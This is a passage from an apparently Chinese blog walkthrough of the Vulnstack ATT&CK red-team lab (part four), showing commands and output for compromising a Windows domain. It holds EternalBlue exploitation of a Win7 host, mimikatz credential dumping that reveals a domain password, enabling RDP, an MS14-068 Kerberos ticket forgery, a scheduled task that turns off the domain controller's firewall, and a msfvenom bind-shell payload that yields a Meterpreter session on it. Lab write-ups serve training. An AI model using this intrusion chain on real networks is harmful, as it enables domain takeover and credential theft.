class=\"hljs-number\">70</span>  Windows <span class=\"hljs-number\">7</span> Enterp  \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - <span class=\"hljs-number\">0x00000010</span>  <span class=\"hljs-number\">72</span> <span class=\"hljs-number\">69</span> <span class=\"hljs-number\">73</span> <span class=\"hljs-number\">65</span> <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">37</span> <span class=\"hljs-number\">36</span> <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">31</span> <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">53</span> <span class=\"hljs-number\">65</span> <span class=\"hljs-number\">72</span> <span class=\"hljs-number\">76</span> <span class=\"hljs-number\">69</span> <span class=\"hljs-number\">63</span>  rise <span class=\"hljs-number\">7601</span> Servic  \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - <span class=\"hljs-number\">0x00000020</span>  <span class=\"hljs-number\">65</span> <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">50</span> <span class=\"hljs-number\">61</span> <span class=\"hljs-number\">63</span> <span class=\"hljs-number\">6b</span> <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">31</span>                          e Pack <span class=\"hljs-number\">1</span>          \n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Target arch selected valid <span class=\"hljs-keyword\">for</span> arch indicated by DCE/RPC reply                 \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Trying exploit with <span class=\"hljs-number\">17</span> Groom Allocations.                                      \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Sending all but last fragment of exploit packet\n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Starting non-paged pool grooming                                               \n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Sending SMBv2 buffers     \n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Closing SMBv1 connection creating <span class=\"hljs-built_in\">free</span> hole adjacent to SMBv2 buffer.          \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Sending final SMBv2 buffers.                     \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Sending last fragment of exploit packet!\n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Receiving response from exploit packet\n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - ETERNALBLUE overwrite completed successfully (<span class=\"hljs-number\">0xC000000D</span>)!                     \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Sending egg to corrupted connection.  \n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - Triggering <span class=\"hljs-built_in\">free</span> of corrupted buffer.    \n[*] Sending stage (<span class=\"hljs-number\">201798</span> bytes) to <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>                                                      \n[*] Session ID <span class=\"hljs-number\">3</span> (<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.129</span>:<span class=\"hljs-number\">50614</span> -> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">6756</span> via session <span class=\"hljs-number\">1</span>) processing AutoRunScript <span class=\"hljs-string\">'post/windows/manage/migrate'</span> \n[*] Running module against TESTWIN7-PC                                                                   \n[*] Current server process: spoolsv.exe (<span class=\"hljs-number\">1104</span>)                                                           \n[*] Spawning notepad.exe process to migrate into                                                         \n[*] Spoofing PPID <span class=\"hljs-number\">0</span>                                                                                      \n[*] Migrating into <span class=\"hljs-number\">836</span>                                                                                   \n[+] Successfully migrated into process <span class=\"hljs-number\">836</span>                                                               \n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                  \n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=        \n[*] Meterpreter session <span class=\"hljs-number\">3</span> opened (<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.129</span>:<span class=\"hljs-number\">50614</span> -> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span>:<span class=\"hljs-number\">6756</span> via session <span class=\"hljs-number\">1</span>) at <span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-12</span><span class=\"hljs-number\">-03</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">01</span> +<span class=\"hljs-number\">0800</span>\n</code></pre>\n</li>\n<li>\n<p><code>WIN-ENS2VR5TR3N</code> <code>192.168.183.130</code> DC，成功不了，可能是考别的知识点</p>\n</li>\n</ul>\n</li>\n</ol>\n<h3>抓取密码</h3>\n<ol>\n<li>\n<p>MSF加载<code>mimikatz</code>模块</p>\n<pre><code class=\"hljs language-c\">meterpreter > load kiwi\nLoading extension kiwi...\n  .#####.   mimikatz <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">0</span> <span class=\"hljs-number\">20191125</span> (x64/windows)\n .## ^ ##.  <span class=\"hljs-string\">\"A La Vie, A L'Amour\"</span> - (oe.eo)\n ## / \\ ##  <span class=\"hljs-comment\">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/</span>\n\nSuccess.\n</code></pre>\n</li>\n<li>\n<p>抓取密码</p>\n<pre><code class=\"hljs language-c\">meterpreter > creds_all\nwdigest credentials\n===================\n\nUsername      Domain  Password\n--------      ------  --------\n(null)        (null)  (null)\nTESTWIN7-PC$  DEMO    /-LDA[<span class=\"hljs-number\">1</span>d hf-tfj)O)yNyCgh[o#D[h7I<span class=\"hljs-comment\">/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDWIzuYDDytr)\\J7(_e(Fctsjl.Zd\"JRr\ndouser        DEMO    Dotest123\n</span></code></pre>\n<p>抓取域用户<code>douser</code>的密码<code>Dotest123</code></p>\n</li>\n</ol>\n<h3>Win7开启RDP</h3>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-c\">meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>\n</li>\n<li>\n<p>开启<code>RDP</code>服务，使用<code>MSF</code>模块</p>\n<pre><code class=\"hljs language-c\">meterpreter > run post/windows/manage/enable_rdp \n\n[*] Enabling Remote Desktop\n[*]     RDP is disabled; enabling it ...\n[*] Setting Terminal Services service startup mode\n[*]     The Terminal Services service is not <span class=\"hljs-built_in\">set</span> to <span class=\"hljs-keyword\">auto</span>, changing it to <span class=\"hljs-keyword\">auto</span> ...\n[*]     Opening port in local firewall <span class=\"hljs-keyword\">if</span> necessary\n[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/<span class=\"hljs-number\">20241203215408</span>_default_192.<span class=\"hljs-number\">168.183</span>.<span class=\"hljs-number\">131</span>_host.windows.cle_035122.txt\n</code></pre>\n</li>\n<li>\n<p>尝试登陆</p>\n<pre><code class=\"hljs language-c\">proxychains rdesktop <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.131</span> -p Dotest123 -u douser\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image57.png\" alt=\"image.png\"></p>\n<p><code>DC</code>上应该是有策略，不允许该用户登录</p>\n</li>\n</ol>\n<h3>寻找可利用点</h3>\n<ol>\n<li>\n<p>在桌面下发现一些常用渗透工具<code>MS14-068</code> 可能是要使用该方法来攻略<code>DC</code></p>\n<pre><code class=\"hljs language-c\">c:\\Users\\douser\\Desktop>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is <span class=\"hljs-number\">605F</span>-F555\n\n Directory of c:\\Users\\douser\\Desktop\n\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">18</span>  <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">40</span>    &#x3C;DIR>          .\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">18</span>  <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">40</span>    &#x3C;DIR>          ..\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">11</span>  <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">06</span>             <span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">189</span> <span class=\"hljs-number\">360</span>极速浏览器.lnk\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">17</span>  <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">53</span>            <span class=\"hljs-number\">14</span>,<span class=\"hljs-number\">336</span> artifact.exe\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">11</span>  <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">05</span>             <span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">406</span> GetUserSPNs.ps1.ps1\n<span class=\"hljs-number\">2015</span>/<span class=\"hljs-number\">11</span>/<span class=\"hljs-number\">19</span>  <span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">37</span>         <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">192</span>,<span class=\"hljs-number\">703</span> Invoke-DCSync.ps1\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">11</span>  <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">37</span>            <span class=\"hljs-number\">47</span>,<span class=\"hljs-number\">937</span> Invoke-Kerberoast.ps1\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">03</span>  <span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">22</span>         <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">040</span>,<span class=\"hljs-number\">136</span> mimikatz.exe\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">15</span>  <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">12</span>         <span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">492</span>,<span class=\"hljs-number\">558</span> MS14<span class=\"hljs-number\">-068.</span>exe\n<span class=\"hljs-number\">2004</span>/<span class=\"hljs-number\">02</span>/<span class=\"hljs-number\">01</span>  <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">23</span>           <span class=\"hljs-number\">344</span>,<span class=\"hljs-number\">576</span> NetSess.exe\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">15</span>  <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">39</span>           <span class=\"hljs-number\">374</span>,<span class=\"hljs-number\">944</span> PsExec64.exe\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">16</span>  <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">13</span>            <span class=\"hljs-number\">53</span>,<span class=\"hljs-number\">248</span> PVEFindADUser.exe\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">16</span>  <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">16</span>               <span class=\"hljs-number\">193</span> report.csv\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">06</span>  <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">05</span>             <span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">175</span> RProcdump.ps1\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">17</span>  <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">52</span>             <span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">897</span> systeiminfo_win7.txt\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">16</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">30</span>             <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">074</span> TGT_douser@demo.com.ccache\n</code></pre>\n</li>\n</ol>\n<h3>MS14-068</h3>\n<ol>\n<li>\n<p>获取用户SID</p>\n<p>首先通过<code>migrate</code>到<code>Douser</code>的内存下</p>\n<pre><code class=\"hljs language-c\">meterpreter > ps\n <span class=\"hljs-number\">2116</span>  <span class=\"hljs-number\">372</span>   conhost.exe        x64   <span class=\"hljs-number\">1</span>        DEMO\\douser                   C:\\Windows\\system32\\conhost.exe\n <span class=\"hljs-number\">2720</span>  <span class=\"hljs-number\">464</span>   taskhost.exe       x64   <span class=\"hljs-number\">1</span>        DEMO\\douser                   C:\\Windows\\system32\\taskhost.exe\n <span class=\"hljs-number\">2784</span>  <span class=\"hljs-number\">2852</span>  explorer.exe       x64   <span class=\"hljs-number\">1</span>        DEMO\\douser                   C:\\Windows\\Explorer.EXE\n <span class=\"hljs-number\">2888</span>  <span class=\"hljs-number\">840</span>   dwm.exe            x64   <span class=\"hljs-number\">1</span>        DEMO\\douser                   C:\\Windows\\system32\\Dwm.exe\nmeterpreter > migrate <span class=\"hljs-number\">2784</span>\n[*] Migrating from <span class=\"hljs-number\">836</span> to <span class=\"hljs-number\">2784.</span>..\n[*] Migration completed successfully.\n</code></pre>\n<p>进入<code>shell</code>模式获取用户<code>SID</code></p>\n<pre><code class=\"hljs language-c\">meterpreter > shell\nC:\\Windows\\system32>whoami /all\nSID                                          \n=========== =============================================\ndemo\\douser S<span class=\"hljs-number\">-1</span><span class=\"hljs-number\">-5</span><span class=\"hljs-number\">-21</span><span class=\"hljs-number\">-979886063</span><span class=\"hljs-number\">-1111900045</span><span class=\"hljs-number\">-1414766810</span><span class=\"hljs-number\">-1107</span>\n</code></pre>\n<p><code>S-1-5-21-979886063-1111900045-1414766810-1107</code></p>\n</li>\n<li>\n<p>利用桌面的<code>ms14-068.exe</code>提权工具生成伪造的<code>kerberos</code>协议认证证书</p>\n<pre><code class=\"hljs language-c\">c:\\Users\\douser\\Desktop>MS14<span class=\"hljs-number\">-068.</span>exe -u douser@demo.com -s S<span class=\"hljs-number\">-1</span><span class=\"hljs-number\">-5</span><span class=\"hljs-number\">-21</span><span class=\"hljs-number\">-979886063</span><span class=\"hljs-number\">-1111900045</span><span class=\"hljs-number\">-1414766810</span><span class=\"hljs-number\">-1107</span> -d <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span> -p Dotest123\nMS14<span class=\"hljs-number\">-068.</span>exe -u douser@demo.com -s S<span class=\"hljs-number\">-1</span><span class=\"hljs-number\">-5</span><span class=\"hljs-number\">-21</span><span class=\"hljs-number\">-979886063</span><span class=\"hljs-number\">-1111900045</span><span class=\"hljs-number\">-1414766810</span><span class=\"hljs-number\">-1107</span> -d <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span> -p Dotest123\n  [+] Building AS-REQ <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>... Done!\n  [+] Sending AS-REQ to <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>... Done!\n  [+] Receiving AS-REP from <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>... Done!\n  [+] Parsing AS-REP from <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>... Done!\n  [+] Building TGS-REQ <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>... Done!\n  [+] Sending TGS-REQ to <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>... Done!\n  [+] Receiving TGS-REP from <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>... Done!\n  [+] Parsing TGS-REP from <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span>... Done!\n  [+] Creating ccache file <span class=\"hljs-string\">'TGT_douser@demo.com.ccache'</span>... Done!\n</code></pre>\n</li>\n<li>\n<p>利用<code>mimikatz</code> （桌面上也有）来导入票据</p>\n<pre><code class=\"hljs language-c\">c:\\Users\\douser\\Desktop>mimikatz.exe\nmimikatz.exe\n\n  .#####.   mimikatz <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">0</span> (x64) #<span class=\"hljs-number\">18362</span> Jan  <span class=\"hljs-number\">2</span> <span class=\"hljs-number\">2020</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">39</span>\n .## ^ ##.  <span class=\"hljs-string\">\"A La Vie, A L'Amour\"</span> - (oe.eo)\n ## / \\ ##  <span class=\"hljs-comment\">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/</span>\n\nmimikatz <span class=\"hljs-meta\"># kerberos::purge</span>\nTicket(s) purge <span class=\"hljs-keyword\">for</span> current session is OK\n\nmimikatz <span class=\"hljs-meta\"># kerberos::list</span>\n\nmimikatz <span class=\"hljs-meta\"># kerberos::ptc C:\\users\\douser\\Desktop\\TGT_douser@demo.com.ccache</span>\n\nPrincipal : (<span class=\"hljs-number\">01</span>) : douser ; @ DEMO.COM\n\nData <span class=\"hljs-number\">0</span>\n           Start/End/MaxRenew: <span class=\"hljs-number\">2024</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">3</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">14</span> ; <span class=\"hljs-number\">2024</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">4</span> <span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">14</span> ; <span class=\"hljs-number\">2024</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">10</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">14</span>\n           Service <span class=\"hljs-title function_\">Name</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">01</span>)</span> : krbtgt ; DEMO.COM ; @ DEMO.COM\n           Target <span class=\"hljs-title function_\">Name</span>  <span class=\"hljs-params\">(<span class=\"hljs-number\">01</span>)</span> : krbtgt ; DEMO.COM ; @ DEMO.COM\n           Client <span class=\"hljs-title function_\">Name</span>  <span class=\"hljs-params\">(<span class=\"hljs-number\">01</span>)</span> : douser ; @ DEMO.COM\n           Flags <span class=\"hljs-number\">50</span>a00000    : pre_authent ; renewable ; proxiable ; forwardable ; \n           Session Key       : <span class=\"hljs-number\">0x00000017</span> - rc4_hmac_nt      \n             d030a0db75eadb9b5f672b49a11721c9\n           Ticket            : <span class=\"hljs-number\">0x00000000</span> - null              ; kvno = <span class=\"hljs-number\">2</span>        [...]\n           * Injecting ticket : OK\n</code></pre>\n<p>操作分别是：清空当前票据，查看当前票据，导入票据</p>\n</li>\n<li>\n<p>查看当前票据</p>\n<pre><code class=\"hljs language-c\">mimikatz <span class=\"hljs-meta\"># kerberos::list</span>\n\n[<span class=\"hljs-number\">00000000</span>] - <span class=\"hljs-number\">0x00000017</span> - rc4_hmac_nt      \n   Start/End/MaxRenew: <span class=\"hljs-number\">2024</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">3</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">14</span> ; <span class=\"hljs-number\">2024</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">4</span> <span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">14</span> ; <span class=\"hljs-number\">2024</span>/<span class=\"hljs-number\">12</span>/<span class=\"hljs-number\">10</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">14</span>\n   Server Name       : krbtgt/DEMO.COM @ DEMO.COM\n   Client Name       : douser @ DEMO.COM\n   Flags <span class=\"hljs-number\">50</span>a00000    : pre_authent ; renewable ; proxiable ; forwardable ;\n</code></pre>\n</li>\n<li>\n<p>尝试通过IPC连接DC</p>\n<p>ps：记得使用主机名，否则默认走<code>NTLM</code>协议</p>\n<pre><code class=\"hljs language-c\">c:\\Users\\douser\\Desktop>dir \\\\WIN-ENS2VR5TR3N\\c$\ndir \\\\WIN-ENS2VR5TR3N\\c$\n Volume in drive \\\\WIN-ENS2VR5TR3N\\c$ has no label.\n Volume Serial Number is <span class=\"hljs-number\">702B</span><span class=\"hljs-number\">-0</span>D1B\n\n Directory of \\\\WIN-ENS2VR5TR3N\\c$\n\n<span class=\"hljs-number\">2009</span>/<span class=\"hljs-number\">07</span>/<span class=\"hljs-number\">14</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">20</span>    &#x3C;DIR>          PerfLogs\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">24</span>  <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">30</span>    &#x3C;DIR>          Program Files\n<span class=\"hljs-number\">2020</span>/<span class=\"hljs-number\">01</span>/<span class=\"hljs-number\">24</span>  <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">30</span>    &#x3C;DIR>          Program <span class=\"hljs-title function_\">Files</span> <span class=\"hljs-params\">(x86)</span>\n2019/12/31  11:01    &#x3C;DIR>          Users\n2020/01/24  13:33    &#x3C;DIR>          Windows\n               0 <span class=\"hljs-title function_\">File</span><span class=\"hljs-params\">(s)</span>              0 bytes\n               5 <span class=\"hljs-title function_\">Dir</span><span class=\"hljs-params\">(s)</span>  11,366,170,624 bytes <span class=\"hljs-built_in\">free</span>\n</code></pre>\n<p>成功访问到域控，也算拿下了</p>\n</li>\n</ol>\n<h3>上线DC</h3>\n<ol>\n<li>\n<p><code>win7</code>桌面下还提供呢<code>Psexec64.exe</code></p>\n<pre><code class=\"hljs language-c\">c:\\Users\\douser\\Desktop>psexec64 \\\\WIN-ENS2VR5TR3N.demo.com cmd.exe \\ipconfig                            \npsexec64 \\\\WIN-ENS2VR5TR3N.demo.com cmd.exe \\ipconfig                                                    \n                                                                                                         \nPsExec v2.<span class=\"hljs-number\">2</span> - Execute processes remotely            \n<span class=\"hljs-title function_\">Copyright</span> <span class=\"hljs-params\">(C)</span> 2001-2016 Mark Russinovich                                                                 \nSysinternals - www.sysinternals.com\n                                                                                                         \nStarting cmd.exe on WIN-ENS2VR5TR3N.demo.com...3N.demo.com...demo.com...                                 \ncmd.exe exited on WIN-ENS2VR5TR3N.demo.com with error code 0.  \n</code></pre>\n<p>但是不知道为什么连不上</p>\n</li>\n<li>\n<p>通过计划任务关闭防火墙</p>\n<ul>\n<li>\n<p>新建<code>1.bat</code>文件</p>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-meta\"># vim 1.bat</span>\nnetsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off\n</code></pre>\n</li>\n<li>\n<p>通过<code>MSF</code>上传到靶机<code>win7</code></p>\n<pre><code class=\"hljs language-c\">meterpreter > upload ~/Desktop/test/<span class=\"hljs-number\">1.b</span>at C:/users/douser/Desktop\n[*] Uploading  : /root/Desktop/test/<span class=\"hljs-number\">1.b</span>at -> C:/users/douser/Desktop\\<span class=\"hljs-number\">1.b</span>at\n[*] Completed  : /root/Desktop/test/<span class=\"hljs-number\">1.b</span>at -> C:/users/douser/Desktop\\<span class=\"hljs-number\">1.b</span>at\n</code></pre>\n</li>\n<li>\n<p>在<code>shell</code>模式将<code>1.bat</code>传到<code>DC</code></p>\n<pre><code class=\"hljs language-c\">C:\\Windows\\system32>copy c:\\users\\douser\\desktop\\<span class=\"hljs-number\">1.b</span>at \\\\WIN-ENS2VR5TR3N\\c$\ncopy c:\\users\\douser\\desktop\\<span class=\"hljs-number\">1.b</span>at \\\\WIN-ENS2VR5TR3N\\c$\n        <span class=\"hljs-number\">1</span> file(s) copied.\n</code></pre>\n</li>\n<li>\n<p>创建计划任务关闭防火墙（<code>ST</code>是时间，也可以调成手动运行）</p>\n<pre><code class=\"hljs language-c\">schtasks /create /S WIN-ENS2VR5TR3N /TN <span class=\"hljs-string\">\"test1\"</span> /TR c:/<span class=\"hljs-number\">1.b</span>at /SC ONCE /ST <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">49</span> /ru system /f\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>通过计划任务上线<code>DC</code></p>\n<ul>\n<li>\n<p><code>msfvenom</code>生成<code>exe</code>马</p>\n<pre><code class=\"hljs language-c\">msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.130</span> LPORT=<span class=\"hljs-number\">2345</span> -f exe > shell.exe\n</code></pre>\n</li>\n<li>\n<p>用上面的方式上传<code>exe</code>马到<code>DC</code></p>\n</li>\n<li>\n<p>Kali监听</p>\n<pre><code class=\"hljs language-c\">msf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(windows/smb/ms17_010_eternalblue)</span> > use exploit/multi/handler \nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> payload windows/x64/meterpreter/bind_tcp\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> lport 2345\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> rhost 192.168.183.130\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > run\n</code></pre>\n</li>\n<li>\n<p>通过计划任务执行<code>shell.exe</code></p>\n<pre><code class=\"hljs language-c\">schtasks /create /S WIN-ENS2VR5TR3N /TN <span class=\"hljs-string\">\"test1\"</span> /TR c:/shell.exe /SC ONCE /ST <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">03</span> /ru system /f\n</code></pre>\n</li>\n<li>\n<p>成功上线MSF</p>\n<pre><code class=\"hljs language-c\">msf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > run\n\n[*] Started bind TCP handler against 192.168.183.130:2345\n[*] Sending <span class=\"hljs-title function_\">stage</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">201798</span> bytes)</span> to 192.168.183.130\n[*] Meterpreter session 1 <span class=\"hljs-title function_\">opened</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>:<span class=\"hljs-number\">44267</span> -> <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>:<span class=\"hljs-number\">1080</span>)</span> at 2024-12-03 23:13:39 +0800\n\nmeterpreter > \n</code></pre>\n</li>\n<li>\n<p>然后通过<code>mimikatz</code>读取密码</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image58.png\" alt=\"image.png\"></p>\n<p>拿到域管理员密码</p>\n</li>\n</ul>\n</li>\n</ol>","title":"Vulnstack - ATT&CK红队评估实战靶场(四)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windows靶机","综合靶场"],"categories":"靶机","description":"ATT&CK红队评估实战靶场(四) 靶机链接：http://vulnstack.qiyuanxuetang.net/vuln/detail/6/ 环境搭建 新建两张仅主机网卡，一张192.168.183.0网段（内网网卡），一张192.168.157.0网段（模拟外网网段），然后按照拓补图分配网卡即..."},"recentPosts":[{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"},{"id":"HackTheBoxSeason8 - 